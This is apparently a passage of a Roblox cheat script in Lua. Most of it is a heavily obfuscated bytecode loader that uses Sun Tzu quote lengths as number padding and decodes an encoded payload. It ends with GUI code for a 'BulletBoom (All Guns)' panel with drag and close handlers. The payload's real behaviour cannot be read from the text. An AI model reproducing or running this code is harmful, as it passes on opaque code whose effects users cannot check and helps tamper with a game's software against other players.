a=g;local a,b=a[o[2]],a[o[3]]if(o[2]>=256)then a=o[2]-256;a=c[a]end;if(o[3]>=256)then b=o[((function(A) return (#A - 92) end)('"Plan for what it is difficult while it is easy, do what is great while it is small." - Sun Tzu'))]-256;b=c[b]end;local a=a;local b=b;if(a==b)~=o[1]then d=d+1 end end end end elseif(8090==m)then local a=o[1]local b=o[(#('"The wise warrior avoids the battle." - Sun Tzu') - 45)]local c=g;local d;local f,g;d={}if(b~=1)then if(b~=0)then f=a+b-1 else f=e end;g=0;for a=a+1,f do g=g+1;d[g]=c[a]end;P(c[a](I(d,1,f-a)))else P(c[a]())end end elseif(7441==m)then W[(b._oi18Jg)][i]=w(v[1],z)K=n(W[g[o[1]]],g[o[2]],g[o[3]])d=d-1*(W[(b._w85OWVOeOxyNu49)])W[(b._MlekP7)]((function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5)))if(P(g[o[1]])==K)then W[(b._MlekP7)]=(function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5))end;do d=d+((function(A) return (#A - 111) end)('"Treat your men as you would your own beloved sons. And they will follow you into the deepest valley." - Sun Tzu'))end;P(g[o[1]](I(args,1,limit-o[1],(K))))end end;if(d>(Y-(#('"The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." - Sun Tzu') - 98)))then break end end end;local a,b=c()if a and(b>0)then return I(a,(#('"The wise warrior avoids the battle." - Sun Tzu') - 46),b)end;return end;return k({},d),e end;local a,f=h((b._y9eNXjnzm0gO8),{14,13},0,c())a.xXo6YY5yZL(0,(b._oi18Jg),(b._w85OWVOeOxyNu49),(b._dW2ISxC),0)do local b=a[(b._aKxp94I)]a("\67\81\115\89\126\83\78\92\66")()a("\111\119\116")()a("\108\109\123\91\97")()a("\110\111\109\80\104\83")()a("\76\98\123\78\104\85\79")()a("\110\111\109\68\104\83")()a("\123\76\115\67\126\17\8")()a("\111\107\110\90\104\83\93\119\124\92\103\124")()a("\80\97\121\86\97\119\80\98\100\91\121")()a("\110\107\107\66\100\85\89")()a("\84\75\72\101\89\115\28\69\72\109\72\88\74\100\96\36\46\24\108\88\79")()a("\104\119\106\82")()a("\123\111\119\82")()a("\91\107\110\100\104\85\74\106\126\91")()end;do local c={}local function f(f)local g={}local h=1;local j=#f-1;local k=function(a)a=a or 1;local b=n(f,h,h+(a-1))h=h+a;return b end;local m=function()local a,b=e(f,h,h+1)h=h+2;return(b*256)+a end;local n=function()local a,b,c=e(f,h,h+((function(A) return (#A - 334) end)('"There are five dangerous faults which may affect a general: (1) Recklessness, which leads to destruction; (2) cowardice, which leads to capture; (3) a hasty temper, which can be provoked by insults; (4) a delicacy of honor which is sensitive to shame; (5) over-solicitude for his men, which exposes him to worry and trouble." - Sun Tzu')))h=h+3;return(c*65536)+(b*256)+a end;local o=function()local a,b,c,d=e(f,h,h+3)h=h+4;return(d*16777216)+(c*65536)+(b*256)+a end;local f=function()local a,b,c,d,e=e(f,h,h+4)h=h+5;return(d*16777216)+(c*65536)+(b*256)+a+(e*4294967296)end;local d,p,q,r=d(0),d(1),d(2),d(3)local r,s,t=e(p),e(q),e(r)local u=a[(b._PZFXyDvdE)]local n=function()local a,c,f;local g=k()if(g==(b._Mx_YeflU2mNT)or g==(b._cuXcrfXuv))then return a,c,f else local h=k()if h==d then a=e(k())elseif h==p then a=k()==(b._ChO3j)end;local e=k()if e==d then local a=(g==(b._Na9Wu3))and n()or o()if(g==(b._su7FH))then a=a-131071 end;c=a elseif e==p then c=k()==(b._ChO3j)end;if(g==(b._Na9Wu3))then local a=k()if a==d then f=n()elseif a==p then f=k()==(b._ChO3j)end end;return a,c,f end end;while true do local g=k()if g==d then local d={}local e=m()local g,h,j=n()d[t]=j;d[(b._f2m0Km)]=f()d[s]=h;d[r]=g;a(e)(d)local a=o()c[a]=e end;if g==p then local d={}local e=e(k())local c=c[e]local e,g,h=n()d[t]=h;d[(b._f2m0Km)]=f()d[r]=e;d[s]=g;a(c)(d)end;if g==q then break end;if h>j then break end end;for a,b in l(c)do c[a]=nil end;c=nil;return g end;f(K)end;do local c=a[(b._mbumVmLZkF)]local c;c=function(f)local g={}local g=1;local h=#f-1;local h=function(a)a=a or 1;local b=n(f,g,g+(a-((function(A) return (#A - 55) end)('"Wheels of justice grind slow but grind fine." - Sun Tzu'))))g=g+a;return b end;local j=function()local a,b,c,d=e(f,g,g+(#('"The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." - Sun Tzu') - 96))g=g+(#('"Great results can be achieved with small forces." - Sun Tzu') - 56)return(d*16777216)+(c*65536)+(b*256)+a end;local k=function()local a,b=e(f,g,g+(#('"If the mind is willing, the flesh could go on and on without many things." - Sun Tzu') - 84))g=g+2;return(b*256)+a end;local l=function()local a,b,c,d,e=e(f,g,g+(#('"Quickness is the essence of the war." - Sun Tzu') - 44))g=g+5;return(d*16777216)+(c*65536)+(b*256)+a+(e*4294967296)end;local f=function()local a,b,c=e(f,g,g+2)g=g+((function(A) return (#A - 124) end)('"If you fight with all your might, there is a chance of life; where as death is certain if you cling to your corner." - Sun Tzu'))return(c*65536)+(b*256)+a end;local g=function()local a=j()local b=j()local c=1;local a=(p(b,1,20)*(2^32))+a;local d=p(b,21,31)local b=((-1)^p(b,32))if(d==0)then if(a==0)then return b*0 else d=1;c=0 end elseif(d==2047)then if(a==0)then return b*(((function(A) return (#A - 319) end)('"The skillful tactician may be likened to the shuai-jan. Now the shuai-jan is a snake that is found in the Chang mountains. Strike at its head, and you will be attacked by its tail; strike at its tail, and you will be attacked by its head; strike at its middle, and you will be attacked by head and tail both." - Sun Tzu'))/0)else return b*(0/0)end end;return o(b,d-1023)*(c+(a/(((function(A) return (#A - 144) end)('"To secure ourselves against defeat lies in our own hands, but the opportunity of defeating the enemy is provided by the enemy himself." - Sun Tzu'))^52)))end;local m=function()return j()*4294967296+j()end;local d,m,o,p=d(0),d(1),d((#('"There are not more than five musical notes, yet the combinations of these five give rise to more melodies than can ever be heard. There are not more than five primary colours, yet in combination they produce more hues than can ever been seen. There are not more than five cardinal tastes, yet combinations of them yield more flavours than can ever be tasted." - Sun Tzu') - 368)),d(3)local o,p,q=e(m),e(o),e(p)local a=a[(b._mbumVmLZkF)]local a=function()local a,b,c;local g=e(h())if(g==(#('"The skillful tactician may be likened to the shuai-jan. Now the shuai-jan is a snake that is found in the Chang mountains. Strike at its head, and you will be attacked by its tail; strike at its tail, and you will be attacked by its head; strike at its middle, and you will be attacked by head and tail both." - Sun Tzu') - 316)or g==5)then return a,b,c else local k=h()if k==d then a=e(h())elseif k==m then a=e(h())==6 end;local k=h()if k==d then local a=(g==1)and f()or j()if(g==3)then a=a-131071 end;b=a elseif k==m then b=e(h())==6 end;if(g==1)then local a=h()if a==d then c=f()elseif a==m then c=e(h())==6 end end;return a,b,c end end;local f,r,s=0,0,0;local t={[(b._oi18Jg)]={},[(b._w85OWVOeOxyNu49)]={},[(b._dW2ISxC)]={}}t[(b._UnuHrnmomO)]=h():byte()t[(b._KUiGabZSAZxq)]=h():byte()local u={}while(true)do local w=e(h())if(w==(#('"In the midst of chaos, there is also opportunity." - Sun Tzu') - 55))then local a=j()for a=0,a-1 do local a=nil;local a=e(h())do local c=713;local d=66.78673083184523;local e=101.6922771778891;local f={}repeat if(c==344)and((d==140.96001912970868)and(e==425.375307348171)and(f[764]==false)and(f[361]==(b._vg5VyRk))and(f[769]==(b._SD2oKbd)))then c=713;e=101.6922771778891;d=66.78673083184523 end;if(c==448)and((d==34.46881602564807)and(e==12.766277587915681)and(f[764]==false)and(f[361]==(b._n88JnLzkOO783v))and(f[769]==(b._0HTYxmOjTOWuZ)))then d=107.6154274546173;c=882;if(a==3)then s=s+1;t[(b._oi18Jg)][s]=g()end;f[764]=false;f[361]=(b._CqNpM45zIJ)f[769]=(b._SNqdh7)e=28.45320664354087 end;while((d==398.71177366760077)and(e==160.24132196909775)and(f[764]==false)and(f[361]==(b._tVLIgcnewg7FN))and(f[769]==(b._nfYQkIgpj_)))and(c==848)do d=321.05730040539123;f[769]=(b._XoU5Kh4)e=252.257139228853;f[361]=(b._ERODryvaag)f[764]=false;c=254;if(a==5)then s=s+((function(A) return (#A - 81) end)('"Attack is the secret of defense; defense is the planning of an attack." - Sun Tzu'))local a=j()t[(b._oi18Jg)][s]={n(h(a),1,-((function(A) return (#A - 202) end)('"The art of war is of vital importance to the State. It is a matter of life and death, a road either to safety or to ruin. Hence it is a subject of inquiry which can on no account be neglected." - Sun Tzu')))}end;break end;if(c==254)and((d==321.05730040539123)and(e==252.257139228853)and(f[764]==false)and(f[361]==(b._ERODryvaag))and(f[769]==(b._XoU5Kh4)))then break end;while(c==44)and((d==147.32240367646165)and(e==328.2171341272876)and(f[764]==false)and(f[361]==(b._D6m2X))and(f[769]==(b._RVaCyJtGzGHJUAv)))do e=12.766277587915681;d=34.46881602564807;c=448;f[764]=false;if(a==2)then s=s+1;t[(b._oi18Jg)][s]=true end;f[361]=(b._n88JnLzkOO783v)f[769]=(b._0HTYxmOjTOWuZ)break end;while((d==51.02256844133859)and(e==403.7667277788052)and(f[764]==false)and(f[361]==(b._hdta2HbWeh3))and(f[769]==(b._t1CVNAe7)))and(c==330)do if(a==1)then s=s+1;t[(b._oi18Jg)][s]=false end;e=328.2171341272876;f[361]=(b._D6m2X)f[769]=(b._RVaCyJtGzGHJUAv)f[764]=false;d=147.32240367646165;c=44;break end;if(c==713)and((d==66.78673083184523)and(e==101.6922771778891))then c=0;f[361]=(b._8dFXzy9)f[769]=(b._zR4v0)e=0.43524932074097755;d=239.93979666829966;f[764]=false end;while(c==0)and((d==239.93979666829966)and(e==0.43524932074097755)and(f[764]==false)and(f[361]==(b._8dFXzy9))and(f[769]==(b._zR4v0)))do if(a==0)then s=s+1;t[(b._oi18Jg)][s]=nil end;f[769]=(b._t1CVNAe7)d=51.02256844133859;f[764]=false;c=330;f[361]=(b._hdta2HbWeh3)e=403.7667277788052;break end;while(c==882)and((d==107.6154274546173)and(e==28.45320664354087)and(f[764]==false)and(f[361]==(b._CqNpM45zIJ))and(f[769]==(b._SNqdh7)))do if(a==4)then s=s+1;local a=j()t[(b._oi18Jg)][s]=h(a)end;c=848;f[769]=(b._nfYQkIgpj_)f[764]=false;d=398.71177366760077;e=160.24132196909775;f[361]=(b._tVLIgcnewg7FN)break end until(false)end end end;if(w==7)then local c=j()for c=0,c-1 do local c=e(h())if c==e(d)then r=r+(#('"If quick, I survive. If not quick, I am lost. This is death." - Sun Tzu') - 71)local c={}local d=k()local a,e,f=a()c[o]=a;c[q]=f;c[(b._MlekP7)]=d;c[(b._f2m0Km)]=l()c[p]=e;t[(b._w85OWVOeOxyNu49)][r]=c;local a=j()u[a]=d end;if c==e(m)then r=r+1;local c={}local d=e(h())local d=u[d]local a,e,f=a()c[(b._MlekP7)]=d;c[p]=e;c[o]=a;c[(b._f2m0Km)]=l()c[q]=f;t[(b._w85OWVOeOxyNu49)][r]=c end end end;if(w==((function(A) return (#A - 201) end)('Anger may in time change to gladness; vexation may be succeeded by content. But a kingdom that has once been destroyed can never come again into being; nor can the dead ever be brought back to life." - Sun Tzu')))then local a=j()for a=0,a-1 do f=f+1;h()local a=j()t[(b._dW2ISxC)][f]=c(h(a))end end;if(w==9)then break end end;return t end;a(c("\1\0\6\10\0\0\0\5\4\0\0\0\114\107\109\0\5\7\0\0\0\127\124\127\86\121\66\0\5\4\0\0\0\114\107\109\0\5\10\0\0\0\127\97\104\88\120\83\85\109\120\0\5\8\0\0\0\84\122\110\71\74\66\72\0\5\22\0\0\0\84\75\72\101\89\115\28\69\72\109\72\88\74\100\96\36\46\24\108\88\79\0\5\7\0\0\0\110\111\109\80\104\83\0\5\7\0\0\0\104\119\106\82\98\65\0\5\7\0\0\0\110\107\105\66\96\66\0\5\6\0\0\0\74\111\104\80\126\0\7\10\0\0\0\0\251\4\4\0\0\0\0\0\1\0\0\0\0\187\1\2\0\0\0\3\0\0\0\5\0\0\0\0\2\0\0\0\0\192\3\1\0\0\0\0\0\0\0\8\1\0\6\64\64\0\0\3\0\0\0\1\2\2\0\1\0\3\0\0\0\69\0\0\0\0\1\3\1\0\1\0\1\0\0\0\1\1\0\70\128\192\0\0\0\1\1\2\0\2\0\0\0\0\0\164\0\0\0\0\4\0\0\0\0\38\0\1\0\0\0\0\0\0\0\0\0\0\4\0\0\0\0\5\0\0\0\0\224\3\1\0\1\0\2\0\0\0\0\0\0\92\0\0\1\0\6\0\0\0\0\154\31\1\0\0\0\0\0\0\0\1\0\0\28\64\0\0\0\7\0\0\0\0\30\2\1\0\0\0\1\0\0\0\0\0\0\30\0\128\0\0\8\0\0\0\8\1\0\0\0\1\168\3\0\0\1\0\6\26\0\0\0\5\7\0\0\0\121\96\121\88\105\66\0\5\4\0\0\0\85\125\91\0\5\10\0\0\0\67\81\121\88\99\84\72\92\66\0\5\9\0\0\0\104\97\105\67\127\78\82\100\0\5\9\0\0\0\94\111\121\92\125\70\95\104\0\5\8\0\0\0\121\96\121\69\116\87\72\0\5\13\0\0\0\81\97\126\66\97\66\111\96\111\87\123\109\0\5\7\0\0\0\123\76\115\67\126\31\0\5\7\0\0\0\110\111\109\68\104\83\0\5\7\0\0\0\123\93\115\77\104\83\0\5\6\0\0\0\104\111\120\91\104\0\5\22\0\0\0\84\75\72\101\89\115\28\69\72\109\72\88\74\100\96\36\46\24\108\88\79\0\5\10\0\0\0\107\97\104\92\126\87\93\96\120\0\5\7\0\0\0\105\96\106\86\110\76\0\5\8\0\0\0\110\107\107\66\100\85\89\0\2\5\5\0\0\0\112\97\123\83\0\5\8\0\0\0\121\96\121\69\116\87\72\0\5\5\0\0\0\82\111\119\82\0\5\13\0\0\0\111\107\110\90\104\83\93\119\124\92\103\124\0\5\9\0\0\0\79\107\110\67\100\73\91\112\0\5\16\0\0\0\123\107\110\69\108\80\81\102\105\95\127\120\124\71\87\0\5\5\0\0\0\114\107\98\67\0\5\15\0\0\0\91\107\110\115\104\84\95\102\115\90\106\119\106\88\0\5\23\0\0\0\90\103\116\83\75\78\78\112\105\125\99\112\114\79\101\108\121\91\69\93\112\119\0\5\13\0\0\0\89\118\106\91\98\84\85\117\120\118\98\109\0\7\29\0\0\0\0\251\4\4\0\0\0\0\0\1\0\0\0\0\38\0\1\0\0\0\0\0\0\0\0\0\0\4\0\0\0\0\2\0\0\0\0\207\2\1\0\0\0\0\0\0\0\24\1\0\11\0\64\0\0\3\0\0\0\0\219\3\2\0\2\0\4\0\0\0\129\64\0\0\0\4\0\0\0\0\224\3\1\0\0\0\3\0\0\0\2\0\0\28\128\128\1\0\5\0\0\0\0\114\1\1\0\0\0\0\0\0\1\6\26\0\0\0\0\6\0\0\0\0\211\0\3\0\0\0\20\0\2\0\22\0\5\128\0\7\0\0\0\0\187\1\2\0\1\0\22\0\0\0\69\128\0\0\0\8\0\0\0\1\3\1\0\2\0\0\0\0\0\23\1\0\139\192\64\0\0\1\5\1\0\2\0\2\0\0\0\3\0\0\156\192\0\1\0\1\7\3\0\0\0\14\0\2\0\22\128\3\128\0\1\3\1\0\6\0\5\0\0\0\1\1\0\139\1\193\2\0\1\4\2\0\8\0\6\0\0\0\1\66\1\0\0\1\5\1\0\6\0\3\0\0\0\2\0\0\156\129\128\1\0\1\6\1\0\6\0\0\0\0\1\6\154\1\0\0\0\1\7\3\0\0\0\9\0\2\0\22\64\2\128\0\0\192\3\1\0\6\0\5\0\0\0\18\1\0\134\129\193\2\0\9\0\0\0\0\228\2\1\1\7\0\6\0\0\0\20\1\0\23\192\65\3\0\10\0\0\0\1\7\3\0\0\0\6\0\2\0\22\128\1\128\0\1\8\2\0\6\0\14\0\0\0\133\1\2\0\0\0\238\1\1\0\7\0\5\0\0\0\0\0\0\192\1\128\2\0\11\0\0\0\1\5\1\0\6\0\2\0\0\0\2\0\0\156\129\0\1\0\1\9\1\0\7\0\6\0\0\0\25\1\0\198\65\66\3\0\1\6\1\0\7\0\0\0\0\1\7\218\65\0\0\0\1\7\3\0\0\0\0\0\2\0\22\0\0\128\0\0\85\1\1\0\6\0\25\1\0\0\15\1\0\137\129\194\132\0\12\0\0\0\0\127\1\1\0\1\0\0\0\0\0\2\0\0\97\128\0\0\0\13\0\0\0\1\7\3\0\0\0\238\255\1\0\22\128\251\127\0\0\30\2\1\0\0\0\1\0\0\0\0\0\0\30\0\128\0\0\14\0\0\0\8\0\0\0\0\9\9"))end;return f(c())end end)({[121.04343380471092]="Ydd9H0ub7HUgFs6OzGe8";[-79.14045864912256]="m3At84r4yT_Rrl9pbxjkVNy0gm";["wRQ0foRSNmxa9guWeas"]="hmdVdqo5VAeUSUyLaRrJCzFq";[-176.70995804193535]="wongiu0z";[-63.54559882508215]="MDH8Zieb_kYmFpkC";["cEkxiLJ5DPN9"]="ErdP28KPOpMc6Re0ibvll2OX8Ru";["tINHiShJaj88o7h5CThpaX1W2Eo"]="Kxf2Pf56R0KLe";[142.0126650311675]="Ftd4ruu6pIJxb9syc47fFv";[131.67724577478396]="hF19Y0TiVO_x";[-110.03818217056656]="rExpBWzEekEFdnpHaN";[-255.33117113586547]="pASsqdEaFrfGRRiuk2tPr7JwUh";[130.27748791671388]="886OdydvZ";[-158.84233409466376]="aQboyix0rB7jr_FNzW67E_bpin";[55.52286634314342]="o2US4x5U4B39xpHsmxxuB0";["w_yrzgMkD"]="uPOoLxxF";["jfs2NfxL73ZkpatFyDnI3TdnoFwzEtY"]="ymD5zmvq3gk";[338.9770652585763]="Lu57lPxwIp7iy6TkgVLIQIqP";[82.643369139836]="e55RZzQm_3i";[-279.8737356371509]="aFOql_gBc8";[1]=c();["XnYnm7HC_XZVJESzlH5"]="O4x2v6PMSOq";[2]=a;["cE8Pum5AM_e5tImSoV"]="AHfdcQEpG36MLBgFjVlMKzgd"})
end)

TextLabel_3.Parent = BulletBoomAllGuns
TextLabel_3.BackgroundColor3 = Color3.fromRGB(248, 255, 107)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(-0.389380544, 0, 0.190476194, 0)
TextLabel_3.Size = UDim2.new(0, 206, 0, 50)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "(All Guns)"
TextLabel_3.TextColor3 = Color3.fromRGB(157, 0, 3)
TextLabel_3.TextSize = 16.000

-- Scripts:

local function YNKSMO_fake_script() -- MAINGUI.DragGui 
	local script = Instance.new('LocalScript', MAINGUI)

	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end
coroutine.wrap(YNKSMO_fake_script)()
local function GGHIGI_fake_script() -- CerrarGui.LocalScript 
	local script = Instance.new('LocalScript', CerrarGui)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(GGHIGI_fake_script)()
